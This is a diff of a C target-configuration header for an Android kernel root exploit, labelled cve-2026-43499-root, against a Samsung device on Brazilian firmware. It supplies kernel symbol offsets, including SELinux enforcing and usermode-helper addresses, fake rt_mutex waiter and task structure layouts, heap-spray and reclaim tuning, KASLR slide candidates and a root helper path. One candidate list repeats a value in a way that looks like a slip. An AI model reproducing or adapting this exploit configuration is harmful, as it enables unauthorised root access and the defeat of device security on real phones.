@@ -7,10 +7,27 @@
 // Device: essi
 // SDK: 34
 // Region: ZTO (Brazil)
+// Port base: S24 Plus (e2s-S926BXXUEDZDR) + S24 FE coreano
+// vmlinux extraido do firmware BR ZTO oficial
 // ============================================================================
 
 #if defined(APP_PAYLOAD) && APP_PAYLOAD
 #define BUILD_VARIANT_LABEL "essi-S721BXXS3AYB8-app-physical-p0-oracle"
+#define APP_DEFAULT_FAST_KSNITCH 1
+#define APP_REQUIRE_FRESH_P0_SESSION 1
+#define APP_FOPS_DATA_ALIAS_DIAG_ONLY 1
+#define APP_FOPS_DATA_ALIAS_GATE_VERIFY 1
+#define APP_P0_FINGERPRINT_INVERSE_SLIDE 1
+#define APP_FOPS_REUSE_VERIFIED_PAGE 1
+#define APP_PRODUCTION_SLOT_PI_RIGHT 0
+#define APP_PRODUCTION_SLOT_PROVEN_LEFT 1
+#define APP_PRODUCTION_SLOT_FULL_FOPS_GEOMETRY 1
+#define APP_PRODUCTION_STACK_PI_RIGHT_ONLY 1
+#define APP_FOPS_DEFER_ALIAS_READBACK 1
+#define APP_FOPS_DURABLE_POSTWRITE_LOG 1
+#define APP_P0_REFRESH_ORACLE_EACH_FRESH_PAGE 1
+#define APP_FOPS_TABLE_MIRROR_OFF 0x1e80
+#define APP_KERNEL_PAGE_KSNITCH_EXACT_PARTITION 1
 #define APP_PHYS_P0_ORACLE 1
 #else
 #define BUILD_VARIANT_LABEL "essi-S721BXXS3AYB8-root-umh"
@@ -20,12 +37,52 @@
 #define BUILD_FINGERPRINT  "samsung/essi/essi:14/UP1A.231005.007/S721BXXS3AYB8:user/release-keys"
 #endif
 
+// ============================================================================
+// BASES DE MEMORIA
+// ============================================================================
 #define KIMAGE_TEXT_BASE 0xffffffc008000000ULL
 #define P0_PAGE_OFFSET 0xffffff8000000000ULL
 #define P0_PHYS_OFFSET 0x80000000ULL
 #define P0_KERNEL_PHYS_LOAD 0x80000000ULL
-#define SKB_DATA_DELTA (-0xe60LL)
 
+// ============================================================================
+// KERNELSNITCH & HEAP CONFIGS
+// ============================================================================
+#define MM_STRUCT_SZ 0x400
+#define MM_ORDER 3
+#define KERNELSNITCH_MTE_ENABLED 1
+#define KERNELSNITCH_VERBOSE 1
+#define KERNELSNITCH_FUTEX_HASH_SIZE 0x1000
+#define KSNITCH_COLLISIONS 5
+#define KERNELSNITCH_COLLISION_CONFIRMATIONS 3
+
+// ============================================================================
+// SKB DATA DELTA
+// ============================================================================
+#define SKB_DATA_DELTA (-0x1000LL)
+
+// ============================================================================
+// RECLAIM / HEAP SPRAY CONFIGS
+// ============================================================================
+#if defined(APP_PAYLOAD) && APP_PAYLOAD
+#define APP_SLIDE_RECLAIM_SENDS 192
+#define APP_SLIDE_RECLAIM_SNDBUF 16777216
+#define APP_MM_LATE_DRAIN_TRIGGERS 2
+#define APP_DEFER_FINAL_DRAIN_REAP 1
+#define APP_DEFER_ALL_DRAIN_REAPS 1
+#define APP_QUIET_RECLAIM_WINDOW 1
+#define APP_SLIDE_MIN_OBJECT_INDEX 27
+#define APP_SLIDE_MAX_OBJECT_INDEX 30
+#define APP_FOPS_MIN_OBJECT_INDEX 24
+#define APP_RECLAIM_MAX_DIRECT_BASE 0xffffff8080000000ULL
+#define APP_PSELECT_TRIGGER_MAX_AGE_USEC 150000
+#define APP_ACCEPT_SCHED_TRIGGER 1
+#define APP_PSELECT_POST_GUARD_AGE_CHECK 1
+#endif
+
+// ============================================================================
+// SLIDE / PSELECT CONFIGS
+// ============================================================================
 #define SLIDE_FAKE_WAITER_PRIO 0
 #define SLIDE_WAITER_WAKE_STATE 0
 #define SLIDE_LOCK_OWNER_VALUE 1ULL
@@ -33,18 +90,36 @@
 #define SLIDE_TRACEFS_EVENT_ID 106
 #define SLIDE_TRACEFS_WORKER_CALLER_OFF 0x000def04ULL
 #define SLIDE_PSELECT_WORD_SHIFT 0
-#define SLIDE_P0_OFFSET_CANDIDATES  0x000000ULL, 0x010000ULL, 0x020000ULL, 0x030000ULL,  0x040000ULL, 0x050000ULL, 0x060000ULL, 0x070000ULL,  0x080000ULL, 0x090000ULL, 0x0a0000ULL, 0x0b0000ULL,  0x0c0000ULL, 0x0d0000ULL, 0x0e0000ULL, 0x0f0000ULL,  0x100000ULL, 0x110000ULL, 0x120000ULL, 0x130000ULL,  0x140000ULL, 0x150000ULL, 0x160000ULL, 0x170000ULL,  0x180000ULL, 0x190000ULL, 0x1a0000ULL, 0x1b0000ULL,  0x1c0000ULL, 0x1d0000ULL, 0x1e0000ULL, 0x1f0000ULL
+#define SLIDE_P0_OFFSET_CANDIDATES  \
+  0x000000ULL, 0x010000ULL, 0x020000ULL, 0x030000ULL,  \
+  0x040000ULL, 0x050000ULL, 0x060000ULL, 0x070000ULL,  \
+  0x080000ULL, 0x090000ULL, 0x0a0000ULL, 0x0b0000ULL,  \
+  0x0c0000ULL, 0x0d0000ULL, 0x0e0000ULL, 0x0f0000ULL,  \
+  0x100000ULL, 0x110000ULL, 0x120000ULL, 0x130000ULL,  \
+  0x140000ULL, 0x150000ULL, 0x160000ULL, 0x170000ULL,  \
+  0x180000ULL, 0x190000ULL, 0x1a0000ULL, 0x0b0000ULL,  \
+  0x1c0000ULL, 0x1d0000ULL, 0x1e0000ULL, 0x1f0000ULL
 #define SLIDE_MAX_ATTEMPTS 32
 
 #if defined(APP_PAYLOAD) && APP_PAYLOAD
+#define SLIDE_KERNEL_PAGE_SETUP_ATTEMPTS 8
+#define APP_SLIDE_FRESH_PAGE_ATTEMPTS 8
+#define APP_FOPS_FRESH_PAGE_ATTEMPTS 8
+#define FOPS_KERNEL_PAGE_SETUP_ATTEMPTS 8
+#define DEFAULT_EXPLOIT_ATTEMPTS 1
+#define DEFAULT_ATTEMPT_TIMEOUT_SEC 2200
+#define DEFAULT_P0_ATTEMPT_TIMEOUT_SEC 1200
 #define ROUTE_WAIT_SECONDS 8
 #define PSELECT_ENTER_DELAY_USEC 50000
-#define SLIDE_PSELECT_TIMEOUT_NSEC 100000000L
+#define SLIDE_PSELECT_TIMEOUT_NSEC 500000000L
+#define SLIDE_PSELECT_READY_TIMEOUT_USEC 20000
+#define SLIDE_PSELECT_RECHECK_TIMEOUT_USEC 20000
+#define SLIDE_PSELECT_WCHAN_CONFIRMATIONS 3
 #define SLIDE_KSNITCH_APPENDED_FUTEXES 2048
 #define SLIDE_KSNITCH_REPEAT_MEASUREMENT 64
 #define SLIDE_KSNITCH_AVERAGE 8
-#define SLIDE_BANK_SLOTS 4
-#define SLIDE_BANK_TASK_OFF 0x1000
+#define SLIDE_BANK_SLOTS 5
+#define SLIDE_BANK_TASK_OFF 0x3200
 #define SLIDE_BANK_TASK_STRIDE 0x1c0
 #define SLIDE_BANK_LOCK_OFF 0x5200
 #define SLIDE_BANK_SLOT_STRIDE 0x100
@@ -53,19 +128,25 @@
 #define P0_ORACLE_PROBE_SLOT 1
 #define P0_ORACLE_GATE_RESTORE_SLOT 2
 #define P0_ORACLE_PROBE_RESTORE_SLOT 3
+#define P0_ORACLE_PRODUCTION_SLOT 4
 #define P0_ORACLE_GATE_PAGE_OFF 0x0e80
 #define P0_ORACLE_GATE_OBJECT_INDEX 1
 #define P0_ORACLE_PROBE_OFFSET 0x1f0000ULL
 #define P0_FINGERPRINT_HEADER  "targets/essi-S721BXXS3AYB8/p0_fingerprint.h"
 #endif
 
+// ============================================================================
+// RANGES DE MEMORIA
+// ============================================================================
 #define KERNELSNITCH_IDENTITY_START 0xffffff8000000000ULL
 #define KERNELSNITCH_IDENTITY_END 0xffffff9000000000ULL
 #define DIRECT_MAP_BASE 0xffffff8000000000ULL
 #define DIRECT_MAP_END 0xffffff9000000000ULL
 #define VMEMMAP_START 0xfffffffe00000000ULL
 
-// --- Symbol offsets (from vmlinux.elf, base 0xffffffc008000000) ---
+// ============================================================================
+// SYMBOL OFFSETS - EXTRAIDOS DO vmlinux.elf ZTO OFICIAL
+// ============================================================================
 #define CALL_USERMODEHELPER_EXEC_WORK_OFF 0x000d75c8ULL
 #define NOOP_LLSEEK_OFF 0x0039b408ULL
 #define COPY_SPLICE_READ_OFF 0x003e8a4cULL
@@ -86,12 +167,14 @@
 #define SELINUX_ENFORCING_OFF 0x023e75c8ULL
 #define SLIDE_SYSCTL_BOOTID_OFF 0x0248da78ULL
 #define SLIDE_NFULNL_LOGGER_OBJECT_OFF 0x02112a60ULL
-#define SLIDE_NFULNL_LOGGER_NAME_OFF 0x01598a0aULL        // <-- ADICIONADO (strings kernel.raw)
-#define NFULNL_LOGGERS_OFF 0x021129a8ULL                  // <-- ADICIONADO (llvm-nm loggers)
-#define SLIDE_RANDOM_TABLE_BOOT_ID_DATA_PTR_OFF 0x02245570ULL
-#define ASHMEM_MISC_FOPS_OFF 0x0228a228ULL
+#define SLIDE_NFULNL_LOGGER_NAME_OFF 0x01598a0aULL
+#define NFULNL_LOGGERS_OFF 0x021129a8ULL
+#define SLIDE_RANDOM_TABLE_BOOT_ID_DATA_PTR_OFF 0x02245468ULL
+#define ASHMEM_MISC_FOPS_OFF 0x0228a218ULL
 
-// --- Computed absolute addresses ---
+// ============================================================================
+// COMPUTED ABSOLUTE ADDRESSES
+// ============================================================================
 #define ASHMEM_MISC_FOPS (KIMAGE_TEXT_BASE + ASHMEM_MISC_FOPS_OFF)
 #define ASHMEM_FOPS (KIMAGE_TEXT_BASE + ASHMEM_FOPS_OFF)
 #define ASHMEM_IOCTL (KIMAGE_TEXT_BASE + ASHMEM_IOCTL_OFF)
@@ -110,14 +193,18 @@
 #define KMALLOC_CACHES (KIMAGE_TEXT_BASE + KMALLOC_CACHES_OFF)
 #define ANON_PIPE_BUF_OPS (KIMAGE_TEXT_BASE + ANON_PIPE_BUF_OPS_OFF)
 
-// --- Root UMH ---
+// ============================================================================
+// ROOT UMH
+// ============================================================================
 #define ROOT_UMH_PATH "/data/local/tmp/cve-2026-43499-root"
 #define CALL_USERMODEHELPER_EXEC_WORK (KIMAGE_TEXT_BASE + CALL_USERMODEHELPER_EXEC_WORK_OFF)
 #define SYSTEM_UNBOUND_WQ (KIMAGE_TEXT_BASE + SYSTEM_UNBOUND_WQ_OFF)
 #define ROOT_UMH_WORK_OFF 0x6000
 #define ROOT_UMH_DATA_OFF 0x6200
 
-// --- Slide aliases ---
+// ============================================================================
+// SLIDE ALIASES
+// ============================================================================
 #define SLIDE_RB_PARENT_TYPE_RESTORE 1ULL
 #define SLIDE_INIT_TASK_OFF INIT_TASK_OFF
 #define SLIDE_ROOT_TASK_GROUP_OFF ROOT_TASK_GROUP_OFF
@@ -129,26 +216,24 @@
 #define SLIDE_ROOT_TASK_GROUP_IMAGE (KIMAGE_TEXT_BASE + SLIDE_ROOT_TASK_GROUP_OFF)
 #define SLIDE_SYSCTL_BOOTID_IMAGE (KIMAGE_TEXT_BASE + SLIDE_SYSCTL_BOOTID_OFF)
 
-// --- Fake waiter layout ---
-#define LOCK_OFF 0x2210
-#define W0_OFF 0x2350
-#define FOPS_OFF 0x2000
-#define SCRATCH_OFF 0x3000
-#define RIGHT_OFF 0x4440
-#define LEFT_OFF 0x5550
+// ============================================================================
+// FAKE WAITER LAYOUT - FORMATO COMPACTO (kernel 6.1+)
+// ============================================================================
+#define COMPACT_RT_MUTEX_WAITER 1
+
+#define FAKE_WAITER_PI_TREE_ENTRY_OFF 0x18
+#define FAKE_WAITER_TASK_OFF 0x30
+#define FAKE_WAITER_LOCK_OFF 0x38
+#define FAKE_WAITER_WAKE_STATE_OFF 0x40
+#define FAKE_WAITER_PRIO_OFF 0x44
+#define FAKE_WAITER_DEADLINE_OFF 0x48
+#define FAKE_WAITER_WW_CTX_OFF 0x50
+#define FAKE_WAITER_LAYOUT_SIZE 0x58
+
+// ============================================================================
+// FAKE TASK LAYOUT
+// ============================================================================
 #define FAKE_TASK_OFF 0x3200
-
-#define FAKE_WAITER_TREE_PRIO_OFF 0x18
-#define FAKE_WAITER_TREE_DEADLINE_OFF 0x20
-#define FAKE_WAITER_PI_TREE_ENTRY_OFF 0x28
-#define FAKE_WAITER_PI_TREE_PRIO_OFF 0x40
-#define FAKE_WAITER_PI_TREE_DEADLINE_OFF 0x48
-#define FAKE_WAITER_TASK_OFF 0x50
-#define FAKE_WAITER_LOCK_OFF 0x58
-#define FAKE_WAITER_WAKE_STATE_OFF 0x60
-#define FAKE_WAITER_WW_CTX_OFF 0x68
-
-// --- Fake task layout ---
 #define FAKE_TASK_USAGE_OFF 0x40
 #define FAKE_TASK_PRIO_OFF 0x84
 #define FAKE_TASK_NORMAL_PRIO_OFF 0x8c
@@ -158,14 +243,22 @@
 #define FAKE_TASK_PI_TOP_TASK_OFF 0x948
 #define FAKE_TASK_PI_BLOCKED_ON_OFF 0x950
 
-// --- Configfs ---
+// ============================================================================
+// OUTRAS STRUCTS
+// ============================================================================
+#define LOCK_OFF 0x2210
+#define W0_OFF 0x2350
+#define FOPS_OFF 0x2000
+#define SCRATCH_OFF 0x3000
+#define RIGHT_OFF 0x4440
+#define LEFT_OFF 0x5550
+
 #define CFG_PAGE_OFF 16
 #define CFG_NEEDS_READ_FILL_OFF 80
 #define CFG_BIN_BUFFER_OFF 88
 #define CFG_BIN_BUFFER_SIZE_OFF 96
 #define CFG_CB_MAX_SIZE_OFF 100
 
-// --- Workqueue / pool ---
 #define WQ_DFL_PWQ_OFF 0xb0
 #define PWQ_POOL_OFF 0x00
 #define PWQ_WQ_OFF 0x08
@@ -177,22 +270,18 @@
 #define POOL_WORKLIST_OFF 0x28
 #define POOL_NR_IDLE_OFF 0x3c
 
-// --- Work struct ---
 #define WORK_DATA_OFF 0x00
 #define WORK_ENTRY_OFF 0x08
 #define WORK_FUNC_OFF 0x18
 
-// --- Page struct ---
 #define STRUCT_PAGE_SIZE 0x40
 #define STRUCT_PAGE_COMPOUND_HEAD_OFF 0x08
 #define STRUCT_SLAB_CACHE_OFF 0x18
 #define STRUCT_PAGE_TYPE_OFF 0x30
 
-// --- Pipe ---
 #define PIPE_BUFFER_SLOTS 32
 #define PIPE_BUF_FLAG_CAN_MERGE 0x10
 
-// --- File operations ---
 #define FOPS_OWNER_OFF 0x00
 #define FOPS_LLSEEK_OFF 0x08
 #define FOPS_READ_OFF 0x10
